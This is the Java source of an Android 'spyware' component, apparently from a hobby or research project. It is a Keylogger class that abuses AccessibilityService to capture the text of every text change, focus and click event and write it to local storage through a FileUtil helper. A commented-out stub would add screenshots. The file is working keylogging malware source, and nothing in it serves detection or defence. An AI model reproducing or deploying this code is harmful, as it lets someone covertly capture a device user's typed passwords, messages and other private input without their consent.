package com.example.cristianturetta.spyware;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;

import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Locale;

public class Keylogger extends AccessibilityService{
    private FileUtil fileUtil;

    public Keylogger() {
        super();
        fileUtil = FileUtil.getInstance();

    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent accessibilityEvent) {
        DateFormat df = new SimpleDateFormat("dd/mm/yyyy, HH:mm:ss z", Locale.ITALIAN);
        String time = df.format(Calendar.getInstance().getTime());
        FileUtil fileUtil = FileUtil.getInstance();

        // TODO find a way in order to get the  current activity from here
        // ScreenShooter may take an activity instead a context in his constructor
        // ScreenShooter shooter = new ScreenShooter(this);
        // shooter.takeScreenShot();

        switch(accessibilityEvent.getEventType()) {
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED: {
                String data = accessibilityEvent.getText().toString();
                fileUtil.storeKeypress("|(TEXT)|" + data + "\n");
                break;
            }
            case AccessibilityEvent.TYPE_VIEW_FOCUSED: {
                String data = accessibilityEvent.getText().toString();
                fileUtil.storeKeypress("|(FOCUSED)|" + data + "\n");
                break;
            }
            case AccessibilityEvent.TYPE_VIEW_CLICKED: {
                String data = accessibilityEvent.getText().toString();
                fileUtil.storeKeypress("|(CLICKED)|" + data + "\n");
                break;
            }
            default:
                break;
        }
    }

    @Override
    public void onInterrupt() {

    }
}
